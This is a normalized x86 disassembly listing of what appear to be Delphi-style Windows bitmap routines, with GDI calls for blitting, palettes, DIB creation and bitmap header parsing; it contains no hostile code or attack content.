mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428d5f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_4284e4
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_428db8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425b10
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428310
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_428e20
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax esi
call sub_429530
mov eax [ esi + 0x28 ]
call sub_428314
mov eax [ esi + 0x2c ]
call sub_403254
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41ab9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_428e5c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_428f14
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c68
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_429800
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_428310
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428314
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41abc8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_428f4c
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429530
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428fdb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_428b48
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_4284e4
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429800
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428fe0
mov eax [ ebp - 0x8 ]
call sub_422718
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_403a08
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_42900c
push ebx
mov ebx eax
mov eax ebx
call sub_429300
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40d788
pop ebx
retn
sub_42903c
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_41c2e8
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_429530
lea eax [ ebx + 0x2c ]
call sub_40d788
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429800
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_4290b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_42466c
mov eax ebx
call sub_429640
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_42943c
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push sub_4292ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
call SetStretchBltMode
mov eax ebx
call sub_429380
mov dl [ r-xdata ]
call sub_42466c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4295e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_429380
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292f3
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_429281
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_429380
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424b34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_429300
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_429540
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_428f4c
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_4248e8
sub_429380
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_429540
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42811c
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_42900c
sub_4293c8
push ebx
mov ebx eax
mov eax ebx
call sub_429530
mov eax ebx
call sub_429540
mov edx ebx
mov eax ebx
call sub_42900c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4293ec
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_42946c
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_422fe8
mov eax ebx
call sub_42943c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_429380
xor edx edx
pop ecx
call sub_424500
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4294bc
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_429640
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4284e4
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_429540
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41c284
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4295c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4295e0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_429530
mov eax ebx
call sub_429540
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_42946c
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_428bac
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_4280a0
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_429640
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425080
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_4280a0
push 0x0
call GetDC
call sub_424990
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4296f8
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424858
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_428f4c
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_429530
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c68
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_42977c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41c264
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_429e90
pop esi
pop ebx
retn
sub_4297a0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push ecx
push 0x2
mov eax [ r-xdata ]
mov cl 0x1
xchg edx ecx
call sub_41caf4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4297f4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4297fb
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_429800
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_429887
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403404
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4298e7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_428314
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_428310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4298ee
push rw-data
call LeaveCriticalSection
retn
sub_429900
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_429e90
pop edx
pop edi
pop esi
pop ebx
retn
sub_429928
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4027c4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_429e45
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_429e18
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c68
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424870
mov dl 0x1
mov eax [ r-xdata ]
call sub_403224
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41c500
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402c68
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41c490
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424b00
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424b20
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41c490
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424990
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_429d93
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_424dc8
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4027c4
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_429cfb
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41c490
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_429ccf
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425080
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
